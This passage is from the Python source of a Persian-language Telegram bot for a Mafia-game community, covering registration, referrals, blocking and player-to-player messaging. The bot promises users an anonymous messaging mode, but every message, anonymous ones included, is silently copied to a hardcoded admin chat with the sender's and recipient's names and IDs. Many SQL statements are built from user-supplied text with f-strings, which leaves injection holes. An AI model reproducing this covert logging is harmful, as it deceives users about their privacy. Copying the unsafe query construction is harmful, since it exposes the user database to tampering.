⭕️🎲جایزه روزانه🎲: هر روز میتونید یک بار شانستون رو تو هر کدوم از بازی ها امتحان کنید و در صورت برنده شدن سکه به پروفایل شما اضافه میشه
در نهایت وقتی سکه های شما به 25 یا بیشتر رسید میتونید با زدن دکمه برداشت سکه، کوپن سکه خودتون رو دریافت کنید
مشاهده موجودی و برداشت سکه👇
/profile

⭕️افزایش موجودی با کوپن سکه: پایین پروفایل شما یک دکمه به نام واریز سکه وجود داره این دکمه رو بزنید و بعد کوپن سکه ارسال کنید، کوپن سکه هر مقداری که بود همون مقدار به پروفایل شما اضافه میشه 
پروفایل شما👇
/profile

اگه سوالی در مورد نحوه برداشت سکه و هر مورد دیگه ای داشتید تو قسمت پیام به ادمین بپرسید تا راهنماییتون کنم''')




async def Khas(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    if update.message.forward_from.username == 'dohat32bot':
        gggg = update.message.text
        await context.bot.send_message(chat_id="5469541693", text=f'{gggg}\n\n{user_id}')
        jjjdre = update.message.text.split()
        if "فعلی:" in jjjdre:
            index = jjjdre.index("فعلی:")
            response = jjjdre[index + 1]
        elif "لیگ:" in jjjdre:
            index = jjjdre.index("لیگ:")
            response = jjjdre[index + 1]
        c.execute(f"UPDATE users SET Lig='{response}' WHERE user_id={user_id}")
        conn.commit()
        yy = update.message.text.split("سکه:")[0]
        pp = yy.split("شما:")[1]
        words = pp.split("•")[0]
        words = words.strip()
        username = update.message.from_user.username
        harf = 'ثبت نام کرررررررد🐋🐋🐋'
        # await context.bot.send_message(chat_id=update.effective_chat.id, text=words[3])
        try:
            c.execute(f"UPDATE users SET Khas='{words}' WHERE user_id={user_id}")
            conn.commit()
            oo = f"نام شما با موفقیت ثبت شد✅\nنام شما: {words}\n\nکسایی که تا الان در این ربات ثبت نام کردند👇\n/show\n\nهر موقع اسم یا لیگتون رو تغغیر دادید میتونید دوباره پروفایل فوروارد کنید تا اطلاعات شما آپدیت بشه"
            await context.bot.send_message(chat_id=update.effective_chat.id, text=oo)
            await context.bot.send_message(chat_id="5469541693", text=f'{harf}\n\n@{username}\n\n{user_id}')
            aa = c.execute(f"SELECT avalinpm FROM users WHERE user_id={user_id}")
            aa = c.fetchone()
            aa = aa[0]
            if aa == '0':
                c.execute(f"UPDATE users SET avalinpm='{1}' WHERE user_id={user_id}")
                conn.commit()
                rr = c.execute(f"SELECT user_id_ref FROM users WHERE user_id={user_id}")
                rr = c.fetchone()
                rr = rr[0]
                zza = c.execute(f"SELECT username FROM users WHERE user_id={user_id}")
                zza = c.fetchone()
                zza = zza[0]
                law = c.execute(f"SELECT Khas FROM users WHERE user_id={rr}")
                law = c.fetchone()
                law = law[0]
                bbb = c.execute(f"SELECT username FROM users WHERE user_id={rr}")
                bbb = c.fetchone()
                bbb = bbb[0]
                harf = update.message.text
                answer1 = f"ii {rr}"
                answer2 = f"pp {rr}"
                button2 = InlineKeyboardButton("پاسخ", callback_data=answer1)
                button3 = InlineKeyboardButton("تایید✅", callback_data=answer2)
                keyboard2 = InlineKeyboardMarkup([[button2, button3]])
                await context.bot.send_message(chat_id="5469541693", text=f'''🥳کاربر جدید ثبت نام کرد

{user_id} 🐦 @{zza}

دعوت شده توسط:

{rr} 🐗 @{bbb} 🐗 {law}''', reply_markup=keyboard2)
                await context.bot.send_message(chat_id=str(rr), text='🥳کاربری که به ربات دعوت کرده بودید ثبت نام کرد\n\nمنتظر تایید ادمین باش')

        except:
            await update.message.reply_text(f'❌نام {words} قبلا توسط کاربری اشغال شده است\nلطفا نام را تغییر داده و دوباره تلاش کنید')
    else:
        await update.message.reply_text('برای ثبت نام باید پروفایل مافیا خود را فقط فقط از ربات زیر فوروارد کنید👇\n\n@dohat32bot')



async def tayid(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    query = update.callback_query
    query.answer()
    cdehh = query.data
    cdehh = cdehh.split()
    cdehh = cdehh[1]
    user_id = update.effective_user.id
    vv = c.execute(f"SELECT coin FROM users WHERE user_id={cdehh}")
    vv = c.fetchone()
    vv = vv[0]
    if vv == None:
        vv = 0
    ww = c.execute(f"SELECT etc FROM users WHERE user_id=6967243537")
    ww = c.fetchone()
    ww = ww[0]
    # yy = int(vv) + int(ww)
    # c.execute(f"UPDATE users SET coin={yy} WHERE user_id={cdehh}")
    # conn.commit()
    # bu = c.execute(f"SELECT etc FROM users WHERE user_id=5571950188")
    # bu = c.fetchone()
    # bu = bu[0]
    # if bu == None:
    #     bu = 0
    # nr = int(bu) + int(ww)
    # c.execute(f"UPDATE users SET etc={nr} WHERE user_id=5571950188")
    # conn.commit()
    ff = c.execute("SELECT ONER FROM users WHERE user_id = ?", (cdehh,))
    ff = c.fetchone()
    ff = ff[0]
    # if ff == None:
    #     c.execute(f"UPDATE users SET ONER='{1}' WHERE user_id = ?", (cdehh,))
    #     conn.commit()
    if ff == None:
        ff = 0
    yy = int(ff) + 1
    c.execute(f"UPDATE users SET ONER={yy} WHERE user_id={cdehh}")
    conn.commit()
    await context.bot.send_message(chat_id=cdehh , text='دعوت شما توسط ادمین تایید شد✅')
    await context.bot.delete_message(chat_id=update.effective_chat.id, message_id=update.callback_query.message.message_id)




async def Amsg(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    uu = c.execute(f"SELECT Khas FROM users WHERE user_id={user_id}")
    ff = c.fetchone()
    ff = ff[0]
    if ff == None:
        await update.message.reply_text("""❌برای استفاده از این قابلیت اول باید نام خود را ثبت کنید
نحوه ثبت نام: به یکی از ربات های مافیا بروید دکمه پروفایل رو بزنید، سپس پروفایل خود را برای این ربات فوروارد کنید
آموزش تصویری👇
/saptnamgif

کسایی که تا الان در این ربات ثبت نام کردند👇
/show""")
    else:
        await update.message.reply_text("""ممنون از اینکه ثبت نام کردید❤️
این قابلیت بزودی اضافه میشه

کسایی که تا الان در این ربات ثبت نام کردند👇
/show""")

    # ff = str(ff)
    # gg = ff[0].replace("[", "").replace("]", "").replace('"', "")
    # await update.message.reply_text(gg)



ESM = 1
ERSAL = 2

async def shoro(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    if str(user_id) != "5469541693":
        for channel_id in CHANNEL_IDS:
            try:
                # استفاده از getChatMember برای بررسی وضعیت عضویت
                chat_member = await context.bot.get_chat_member(channel_id, user_id)
                # اگر کاربر عضو نباشه
                if chat_member.status in ['left', 'kicked']:
                    # ارسال پیام به کاربر
                    await context.bot.send_message(chat_id=user_id, text="""برای استفاده از قابلیت های ربات شما باید در کانال های زیر عضو باشید👇

@sahere_rasmi - کانال رسمی ساحره(اجباری)
@dohat_nime - کانال غیررسمی ساحره(اجباری)
@MhmdsCh - کانال شخصی من(غیر اجباری)""")
                    return ConversationHandler.END
            except Exception as e:
                # در صورت بروز خطا
                context.bot.send_message(chat_id=user_id, text="مشکلی در بررسی عضویت شما پیش آمده.")
                return ConversationHandler.END
    qq = c.execute(f"SELECT admin_block FROM users WHERE user_id={user_id}")
    qq = c.fetchone()
    qq = qq[0]
    if qq == 1:
        await context.bot.send_message(chat_id=user_id , text='❌شما توسط ادمین بن شدید، برای رفع بن به ادمین پیام بدید')
        return ConversationHandler.END
    uuc = c.execute(f"SELECT etc FROM users WHERE user_id=6364622155")
    uuc = c.fetchone()
    uuc = uuc[0]
    if uuc == 1:
        await context.bot.send_message(chat_id=user_id , text='🔐در حال حاضر این قابلیت قفل است')
        return ConversationHandler.END
    reply = ReplyKeyboardMarkup([['❌بازگشت']], resize_keyboard=True)
    ff = c.execute(f"SELECT Khas FROM users WHERE user_id={user_id}")
    ff = c.fetchone()
    ff = ff[0]
    if ff == None:
        await update.message.reply_text('''❌برای ارسال پیام ربات نیاز داره که اسمت رو بدونه و شما هنوز ثبت نام نکردید!

برای ثبت نام کافیه وارد ربات مافیا @dohat32bot بشید دکمه پروفایل رو بزنید پروفایل رو برای این ربات فوروارد کنید(توجه کنید فوروارد!)تا ربات اسم و لیگت رو متوجه بشه و ذخیره کنه به همین سادگی
آموزش ویدیویی👇
/saptnamgif''')
        return ConversationHandler.END
    else:
        await update.message.reply_text('''📩کد یا نام گیرنده پیام بفرست

لیست کد هر کاربر👇
/show

آموزش ویدئویی پیام فرستادن👇
/msggif

آموزش ارسال بازی دوستانه مافیا👇
/sendbazi

⭕️مثال:با توجه به لیست بالا مثلا کد محمدز، 1 است
پس برای ارسال پیام به محمدز باید کد 1 را ارسال کنیم

برای خروج از دکمه بازگشت استفاده کنید👇''', reply_markup=reply)
        return ESM


async def esmt(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    player = update.message.text
    global keyboard
    username = update.message.from_user.username
    user_id = update.effective_user.id
    button = InlineKeyboardButton("تغییر حالت ارسال پیام", callback_data='aa')
    keyboard2 = InlineKeyboardMarkup([[button]])
    opo = c.execute("SELECT ann FROM users WHERE user_id = ?", (user_id,))
    opo = c.fetchone()
    opo = opo[0]
    if player.isdigit():
        fgh = c.execute("SELECT Block FROM users WHERE id = ?", (player,))
        fgh = c.fetchone()
    else:
        fgh = c.execute("SELECT Block FROM users WHERE Khas = ?", (player,))
        fgh = c.fetchone()

    try:
        if str(user_id) in fgh[0]:
            reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
            await update.message.reply_text('❌شما توسط این کاربر بلاک شده اید', reply_markup=reply_markup)
            return ConversationHandler.END
        else:
            try:
                if player.isdigit():
                    ff = c.execute("SELECT user_id FROM users WHERE id = ?", (player,))
                    ff = c.fetchone()
                    ff = ff[0]
                    iiii = c.execute("SELECT Khas FROM users WHERE id = ?", (player,))
                    iiii = c.fetchone()
                    iiii = iiii[0]
                    qwe = c.execute("SELECT Lig FROM users WHERE id = ?", (player,))
                    qwe = c.fetchone()
                    qwe = qwe[0]
                    context.user_data['ff'] = ff  # Store the ff value in the context
                    if opo == None or opo == 0:
                        await context.bot.send_message(chat_id=user_id, text=f'📮پیام مورد نظر برای ارسال به [ {qwe}{iiii} ] را بفرست\n\nپیام شما به صورت ناشناس ارسال نمیشود❌', reply_markup=keyboard2)
                    elif opo == 1:
                        await context.bot.send_message(chat_id=user_id, text=f'📮پیام مورد نظر برای ارسال به [ {qwe}{iiii} ] را بفرست\n\nپیام شما به صورت ناشناس ارسال میشود✅', reply_markup=keyboard2)
                    # await context.bot.send_message(chat_id="5469541693", text=f'گیرنده پیام [ {qwe}{iiii} ]\n@{username}')
                    return ERSAL
                else:
                    ff = c.execute("SELECT user_id FROM users WHERE Khas = ?", (player,))
                    ff = c.fetchone()
                    ff = ff[0]
                    qwe = c.execute("SELECT Lig FROM users WHERE Khas = ?", (player,))
                    qwe = c.fetchone()
                    qwe = qwe[0]
                    context.user_data['ff'] = ff  # Store the ff value in the context
                    if opo == None or opo == 0:
                        await context.bot.send_message(chat_id=user_id, text=f'📮پیام مورد نظر برای ارسال به [ {qwe}{player} ] را بفرست\n\nپیام شما به صورت ناشناس ارسال نمیشود❌', reply_markup=keyboard2)
                    elif opo == 1:
                        await context.bot.send_message(chat_id=user_id, text=f'📮پیام مورد نظر برای ارسال به [ {qwe}{player} ] را بفرست\n\nپیام شما به صورت ناشناس ارسال میشود✅', reply_markup=keyboard2)
                    # await context.bot.send_message(chat_id="5469541693", text=f'گیرنده پیام [ {qwe}{player} ]\n@{username}')
                    return ERSAL
            except:
                await update.message.reply_text("""❌نام را اشتباه وارد کردید

لطفا آموزش ویدیویی پیام خصوصی فرستادن رو ببینید👇
/msggif

⭕️نکته: لیگ کنار اسم نباید بزارید، «فقط نام»""")
#             await update.message.reply_text("""دوستان ما این ربات رو تازه درست کردیم هنوز افراد زیادی در این ربات ثبت نام نکرده اند 
# ولی ما داریم ربات رو تبلیغ میکنیم که روزی بشه که بتونید به همه پلیر های رندوم مافیا پیام ارسال و دریافت کنید
# ولی به این معنی نیست که الان نمی‌تونید پیام ارسال کنید! اگه شخصی رو میشناسید که در این ربات ثبت نام کرده همین الان میتونید براش پیام ارسال کنید
# تشکر از صبوری شما❤️""")
    except:
        try:
            if player.isdigit():
                ff = c.execute("SELECT user_id FROM users WHERE id = ?", (player,))
                ff = c.fetchone()
                ff = ff[0]
                iiii = c.execute("SELECT Khas FROM users WHERE id = ?", (player,))
                iiii = c.fetchone()
                iiii = iiii[0]
                qwe = c.execute("SELECT Lig FROM users WHERE id = ?", (player,))
                qwe = c.fetchone()
                qwe = qwe[0]
                context.user_data['ff'] = ff  # Store the ff value in the context
                if opo == None or opo == 0:
                    await context.bot.send_message(chat_id=user_id, text=f'📮پیام مورد نظر برای ارسال به [ {qwe}{iiii} ] را بفرست\n\nپیام شما به صورت ناشناس ارسال نمیشود❌', reply_markup=keyboard2)
                elif opo == 1:
                    await context.bot.send_message(chat_id=user_id, text=f'📮پیام مورد نظر برای ارسال به [ {qwe}{iiii} ] را بفرست\n\nپیام شما به صورت ناشناس ارسال میشود✅', reply_markup=keyboard2)
                # await context.bot.send_message(chat_id="5469541693", text=f'گیرنده پیام [ {qwe}{iiii} ]\n@{username}')
                return ERSAL
            else:
                ff = c.execute("SELECT user_id FROM users WHERE Khas = ?", (player,))
                ff = c.fetchone()
                ff = ff[0]
                qwe = c.execute("SELECT Lig FROM users WHERE Khas = ?", (player,))
                qwe = c.fetchone()
                qwe = qwe[0]
                context.user_data['ff'] = ff  # Store the ff value in the context
                if opo == None or opo == 0:
                    await context.bot.send_message(chat_id=user_id, text=f'📮پیام مورد نظر برای ارسال به [ {qwe}{player} ] را بفرست\n\nپیام شما به صورت ناشناس ارسال نمیشود❌', reply_markup=keyboard2)
                elif opo == 1:
                    await context.bot.send_message(chat_id=user_id, text=f'📮پیام مورد نظر برای ارسال به [ {qwe}{player} ] را بفرست\n\nپیام شما به صورت ناشناس ارسال میشود✅', reply_markup=keyboard2)
                # await context.bot.send_message(chat_id="5469541693", text=f'گیرنده پیام [ {qwe}{player} ]\n@{username}')
                return ERSAL
        except:
            await update.message.reply_text("""❌نام را اشتباه وارد کردید

لطفا آموزش ویدیویی پیام خصوصی فرستادن رو ببینید👇
/msggif

⭕️نکته: لیگ کنار اسم نباید بزارید، «فقط نام»""")
#         await update.message.reply_text("""دوستان ما این ربات رو تازه درست کردیم هنوز افراد زیادی در این ربات ثبت نام نکرده اند 
# ولی ما داریم ربات رو تبلیغ میکنیم که روزی بشه که بتونید به همه پلیر های رندوم مافیا پیام ارسال و دریافت کنید
# ولی به این معنی نیست که الان نمی‌تونید پیام ارسال کنید! اگه شخصی رو میشناسید که در این ربات ثبت نام کرده همین الان میتونید براش پیام ارسال کنید
# تشکر از صبوری شما❤️""")

async def hale(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    username = update.message.from_user.username
    ff = context.user_data['ff'] 
    opo = c.execute("SELECT ann FROM users WHERE user_id = ?", (user_id,))
    opo = c.fetchone()
    opo = opo[0]
    try:
        fff = c.execute(f"SELECT Khas FROM users WHERE user_id={user_id}")
        fff = c.fetchone()
        fff = fff[0]
        uu = c.execute(f"SELECT Lig FROM users WHERE user_id={user_id}")
        uu = c.fetchone()
        uu = uu[0]
        qwe = c.execute(f"SELECT Khas FROM users WHERE user_id={ff}")
        qwe = c.fetchone()
        qwe = qwe[0]
        ewe = c.execute(f"SELECT Lig FROM users WHERE user_id={ff}")
        ewe = c.fetchone()
        ewe = ewe[0]
        sdf = c.execute(f"SELECT username FROM users WHERE user_id={ff}")
        sdf = c.fetchone()
        sdf = sdf[0]
        msg = update.message.text
        if opo == None or opo == 0:
            matn = f'📬 شما یک پیام خصوصی از طرف[ {uu}{fff} ] دارید!!\nمتن پیام👇\n\n{msg}'
        elif opo == 1:
            matn = f'👽 شما یک پیام ناشناس دارید!!\nمتن پیام👇\n\n{msg}'
        answer1 = f"yy {user_id}"
        button = InlineKeyboardButton("⛔️بلاک/آنبلاک❎", callback_data=user_id)
        button2 = InlineKeyboardButton("✍️پاسخ", callback_data=answer1)
        keyboard2 = InlineKeyboardMarkup([[button , button2]])
        await context.bot.send_message(chat_id=ff, text=matn, reply_markup=keyboard2)
        reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
        await update.message.reply_text('پیام شما با موفقیت ارسال شد ✅', reply_markup=reply_markup)
        # await context.bot.send_message(chat_id="5469541693", text=f'فرستنده پیام [ {uu}{fff} ]\n@{username}')
        # await context.bot.send_message(chat_id="5469541693", text=msg)
        jhj = f"""📤فرستنده پیام:
{uu}{fff}
@{username}
{user_id}
📥گیرنده پیام:
{ewe}{qwe}
@{sdf}
{ff}
📩متن پیام:

{msg}"""
        await context.bot.send_message(chat_id="5469541693", text=jhj)
        return ConversationHandler.END
    except:
        reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
        await update.message.reply_text('❌در حال حاضر امکان ارسال پیام به این کاربر وجود ندارد', reply_markup=reply_markup)
        return ConversationHandler.END


async def canc(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    global keyboard
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
    await update.message.reply_text("🏠از قسمت ارسال پیام به پلیر خارج شدید", reply_markup=reply_markup)
    return ConversationHandler.END



async def block_user(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    query = update.callback_query
    query.answer()
    # if query.data[0] == "y":
    #     return ConversationHandler.END
    skl = c.execute(f"SELECT Block FROM users WHERE user_id={user_id}")
    skl = c.fetchone()
    skl = skl[0]
    if skl == None:
        c.execute(f"UPDATE users SET Block=CONCAT(Block, ',', {query.data}) WHERE user_id={user_id}")
        conn.commit()
        await context.bot.send_message(chat_id=update.effective_chat.id, text='⛔️کاربر بلاک شد')
    elif query.data not in skl:
        c.execute(f"UPDATE users SET Block=CONCAT(Block, ',', {query.data}) WHERE user_id={user_id}")
        conn.commit()
        await context.bot.send_message(chat_id=update.effective_chat.id, text='⛔️کاربر بلاک شد')
    elif query.data in skl:
        c.execute(f"UPDATE users SET Block = REPLACE(Block, ',{query.data}', '') WHERE user_id = {user_id}")
        conn.commit()
        await context.bot.send_message(chat_id=update.effective_chat.id, text='✅کاربر از بلاکی خارج شد')
    


async def annanimus(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    query = update.callback_query
    query.answer()
    ff = c.execute("SELECT ann FROM users WHERE user_id = ?", (user_id,))
    ff = c.fetchone()
    ff = ff[0]
    if ff == None or ff == 0:
        c.execute(f"UPDATE users SET ann='{1}' WHERE user_id = ?", (user_id,))
        conn.commit()
        await context.bot.send_message(chat_id=update.effective_chat.id, text='پیام شما به صورت ناشناس ارسال میشود✅')
    elif ff == 1:
        c.execute(f"UPDATE users SET ann ='{0}' WHERE user_id = ?", (user_id,))
        conn.commit()
        await context.bot.send_message(chat_id=update.effective_chat.id, text='پیام شما به صورت ناشناس ارسال نمیشود❌')

conv_handler4 = ConversationHandler(
    entry_points=[MessageHandler(filters.Regex(re.compile(r'^📩 پیام خصوصی$')), shoro)],
    states={
        ESM: [MessageHandler(filters.TEXT & ~filters.COMMAND & ~filters.Regex(r'^❌بازگشت$'), esmt),
             MessageHandler(filters.Regex(r'^❌بازگشت$'), canc)],
        ERSAL: [MessageHandler(filters.TEXT & ~filters.COMMAND & ~filters.Regex(r'^❌بازگشت$') , hale),
               MessageHandler(filters.Regex(r'^❌بازگشت$'), canc)],
        ConversationHandler.TIMEOUT:[MessageHandler(filters.TEXT, canc)]
    },
    fallbacks=[],
    conversation_timeout= 120
)

PPPP = 1
async def startanswer(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    if str(user_id) != "5469541693":
        for channel_id in CHANNEL_IDS:
            try:
                # استفاده از getChatMember برای بررسی وضعیت عضویت
                chat_member = await context.bot.get_chat_member(channel_id, user_id)
                # اگر کاربر عضو نباشه
                if chat_member.status in ['left', 'kicked']:
                    # ارسال پیام به کاربر
                    await context.bot.send_message(chat_id=user_id, text="""برای استفاده از قابلیت های ربات شما باید در کانال های زیر عضو باشید👇

@sahere_rasmi - کانال رسمی ساحره(اجباری)
@dohat_nime - کانال غیررسمی ساحره(اجباری)
@MhmdsCh - کانال شخصی من(غیر اجباری)""")
                    return ConversationHandler.END
            except Exception as e:
                # در صورت بروز خطا
                context.bot.send_message(chat_id=user_id, text="مشکلی در بررسی عضویت شما پیش آمده.")
                return ConversationHandler.END
    qq = c.execute(f"SELECT admin_block FROM users WHERE user_id={user_id}")
    qq = c.fetchone()
    qq = qq[0]
    if qq == 1:
        await context.bot.send_message(chat_id=user_id , text='❌شما توسط ادمین بن شدید، برای رفع بن به ادمین پیام بدید')
        return ConversationHandler.END
    query = update.callback_query
    query.answer()
    cdehh = query.data
    context.user_data['cdehh'] = cdehh
    ff = c.execute(f"SELECT Khas FROM users WHERE user_id={user_id}")
    ff = c.fetchone()
    ff = ff[0]
    button = InlineKeyboardButton("تغییر حالت ارسال پیام", callback_data='aa')
    keyboard2 = InlineKeyboardMarkup([[button]])
    opo = c.execute("SELECT ann FROM users WHERE user_id = ?", (user_id,))
    opo = c.fetchone()
    opo = opo[0]
    if ff == None:
        await update.message.reply_text('''❌برای استفاده از این قابلیت اول باید نام خود را ثبت کنید که به دو روش میتونید اینکارو انجام بدید

روش اول(دستی): نقطه خط فاصله لیگ خط فاصله اسم
مثال👇
. 🪤 محمدز

روش دوم(خودکار): به یکی از ربات های مافیا بروید دکمه پروفایل رو بزنید، سپس پروفایل خود را برای این ربات فوروارد کنید ربات لیگ و اسم را از اون پیام استخراج می‌کنه و سیو می‌کنه
آموزش تصویری👇
/saptnamgif

من روش دوم رو بهتون پیشنهاد میکنم چون آسون تر و مطمئن تره
کسایی که تا الان در این ربات ثبت نام کردند👇
/show''')
        return ConversationHandler.END
    else:
        if opo == None or opo == 0:
            await context.bot.send_message(chat_id=update.effective_chat.id, text='🖋پیام مورد نظر برای پاسخ را بنویسید\n\nپیام شما به صورت ناشناس ارسال نمیشود❌', reply_markup=keyboard2)
        elif opo == 1:
            await context.bot.send_message(chat_id=update.effective_chat.id, text='🖋پیام مورد نظر برای پاسخ را بنویسید\n\nپیام شما به صورت ناشناس ارسال میشود✅', reply_markup=keyboard2)
    return PPPP


async def sendanswer(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    username = update.message.from_user.username
    cdehh = context.user_data['cdehh'] 
    cdehh = cdehh.split()
    cdehh = cdehh[1]
    fff = c.execute(f"SELECT Khas FROM users WHERE user_id={user_id}")
    fff = c.fetchone()
    fff = fff[0]
    uu = c.execute(f"SELECT Lig FROM users WHERE user_id={user_id}")
    uu = c.fetchone()
    uu = uu[0]
    fgh = c.execute("SELECT Block FROM users WHERE user_id = ?", (cdehh,))
    fgh = c.fetchone()
    opo = c.execute("SELECT ann FROM users WHERE user_id = ?", (user_id,))
    opo = c.fetchone()
    opo = opo[0]
    msg = update.message.text
    if opo == None or opo == 0:
        matn = f'📬 شما یک پیام خصوصی از طرف[ {uu}{fff} ] دارید!!\nمتن پیام👇\n\n{msg}'
    elif opo == 1:
        matn = f'👽 شما یک پیام ناشناس دارید!!\nمتن پیام👇\n\n{msg}'
    try:
        if str(user_id) in fgh[0]:
            await update.message.reply_text('❌شما توسط این کاربر بلاک شده اید')
            return ConversationHandler.END
        else:
            try:
                qwe = c.execute(f"SELECT Khas FROM users WHERE user_id={cdehh}")
                qwe = c.fetchone()
                qwe = qwe[0]
                ewe = c.execute(f"SELECT Lig FROM users WHERE user_id={cdehh}")
                ewe = c.fetchone()
                ewe = ewe[0]
                sdf = c.execute(f"SELECT username FROM users WHERE user_id={cdehh}")
                sdf = c.fetchone()
                sdf = sdf[0]
                answer = f"yy {user_id}"
                button = InlineKeyboardButton("⛔️بلاک/آنبلاک❎", callback_data=user_id)
                button2 = InlineKeyboardButton("✍️پاسخ", callback_data=answer)
                await context.bot.send_message(chat_id=cdehh, text=matn, reply_markup=keyboard)
                await update.message.reply_text('پیام شما با موفقیت ارسال شد ✅')
                jhj = f"""📤فرستنده پیام:
{uu}{fff}
@{username}
{user_id}
📥گیرنده پیام:
{ewe}{qwe}
@{sdf}
{cdehh}
📩متن پیام:

{msg}"""
                await context.bot.send_message(chat_id="5469541693", text=jhj)
                return ConversationHandler.END
            except SyntaxError:
                await update.message.reply_text('❌در حال حاضر امکان ارسال پیام به این کاربر وجود ندارد')
                return ConversationHandler.END
    except:
            try:
                qwe = c.execute(f"SELECT Khas FROM users WHERE user_id={cdehh}")
                qwe = c.fetchone()
                qwe = qwe[0]
                ewe = c.execute(f"SELECT Lig FROM users WHERE user_id={cdehh}")
                ewe = c.fetchone()
                ewe = ewe[0]
                sdf = c.execute(f"SELECT username FROM users WHERE user_id={cdehh}")
                sdf = c.fetchone()
                sdf = sdf[0]
                answer = f"yy {user_id}"
                button = InlineKeyboardButton("⛔️بلاک/آنبلاک❎", callback_data=user_id)
                button2 = InlineKeyboardButton("✍️پاسخ", callback_data=answer)
                keyboard = InlineKeyboardMarkup([[button , button2]])
                await context.bot.send_message(chat_id=cdehh, text=matn, reply_markup=keyboard)
                await update.message.reply_text('پیام شما با موفقیت ارسال شد ✅')
                # await context.bot.send_message(chat_id="5469541693", text=f'فرستنده پیام [ {uu}{fff} ]\n@{username}')
                # await context.bot.send_message(chat_id="5469541693", text=msg)
                jhj = f"""📤فرستنده پیام:
{uu}{fff}
@{username}
{user_id}
📥گیرنده پیام:
{ewe}{qwe}
@{sdf}
{cdehh}
📩متن پیام:

{msg}"""
                await context.bot.send_message(chat_id="5469541693", text=jhj)
                return ConversationHandler.END
            except SyntaxError:
                await update.message.reply_text('❌در حال حاضر امکان ارسال پیام به این کاربر وجود ندارد')
                return ConversationHandler.END


async def cananswer(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    await update.message.reply_text("🏠از قسمت ارسال پیام به پلیر خارج شدید")
    return ConversationHandler.END



conv_handler5 = ConversationHandler(
    entry_points=[CallbackQueryHandler(startanswer, pattern=r'^y')],
    states={
        PPPP: [MessageHandler(filters.TEXT & ~filters.COMMAND , sendanswer)],
        ConversationHandler.TIMEOUT:[MessageHandler(filters.TEXT, cananswer)]
    },
    fallbacks=[CommandHandler('cancel', cananswer)],
    conversation_timeout= 120
)



# async def MS2(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
#     username = update.message.from_user.username
#     harf = update.message.text
    
#     # ایجاد دکمه شیشه ای
#     button = InlineKeyboardButton("شیشه", callback_data="block_user")
#     keyboard = InlineKeyboardMarkup([[button]])
    
#     # ارسال پیام همراه با دکمه
#     await context.bot.send_message(chat_id="5469541693", text=f'{harf}\n\n@{username}', reply_markup=keyboard)




ESMADM = 1
ERSALADM = 2

async def shoroadm(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    rr = str(user_id)
    if rr == "5469541693":
        await update.message.reply_text('به کی میخوای پیام بفرستی؟')
        return ESMADM
    elif rr == "5571950188":
        await update.message.reply_text('به کی میخوای پیام بفرستی؟')
        return ESMADM
    else:
        return ConversationHandler.END

async def esmtadm(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    try:
        ff = update.message.text
        context.user_data['ff'] = ff
        await update.message.reply_text('پیامت چیه؟')
        return ERSALADM
    except:
        await update.message.reply_text("""❌ارسال نشد""")


async def haleadm(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    username = update.message.from_user.username
    try:
        msg = update.message.text
        matn = f'⭕️شما یک پیام خصوصی از طرف ادمین دارید⭕️\nمتن پیام👇\n\n{msg}\n\n'
        ff = context.user_data['ff'] 
        await context.bot.send_message(chat_id=ff, text=matn)
        await update.message.reply_text('پیام شما با موفقیت ارسال شد ✅')
        return ConversationHandler.END
    except:
        await update.message.reply_text('❌در حال حاضر امکان ارسال پیام به این کاربر وجود ندارد')
        return ConversationHandler.END


async def cancadm(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    await update.message.reply_text("🏠از قسمت ارسال پیام به پلیر خارج شدید")
    return ConversationHandler.END





conv_handler6 = ConversationHandler(
    entry_points=[CommandHandler('sendmsg', shoroadm)],
    states={
        ESMADM: [MessageHandler(filters.TEXT & ~filters.COMMAND , esmtadm)],
        ERSALADM: [MessageHandler(filters.TEXT & ~filters.COMMAND , haleadm)],
        ConversationHandler.TIMEOUT:[MessageHandler(filters.TEXT, cancadm)]
    },
    fallbacks=[CommandHandler('cancel', canc)],
    conversation_timeout= 120
)



ESMADMB = 1

async def shoroB(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    rr = str(user_id)
    if rr == "5469541693" or rr == "5571950188":

        await update.message.reply_text('کیو میخوای بلاک کنی؟')
        return ESMADMB
    else:
        return ConversationHandler.END


async def haleadmB(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    player = update.message.text
    ff = c.execute("SELECT admin_block FROM users WHERE Khas = ?", (player,))
    ff = c.fetchone()
    ff = ff[0]
    if ff == None:
        c.execute(f"UPDATE users SET admin_block='{1}' WHERE Khas = ?", (player,))
        conn.commit()
        await context.bot.send_message(chat_id="5469541693", text=f'⛔️کاربر {player} بلاک شد')
        await context.bot.send_message(chat_id="5571950188", text=f'⛔️کاربر {player} بلاک شد')
    elif ff == 0:
        c.execute(f"UPDATE users SET admin_block='{1}' WHERE Khas = ?", (player,))
        conn.commit()
        await context.bot.send_message(chat_id="5469541693", text=f'⛔️کاربر {player} بلاک شد')
        await context.bot.send_message(chat_id="5571950188", text=f'⛔️کاربر {player} بلاک شد')
    elif ff == 1:
        c.execute(f"UPDATE users SET admin_block='{0}' WHERE Khas = ?", (player,))
        conn.commit()
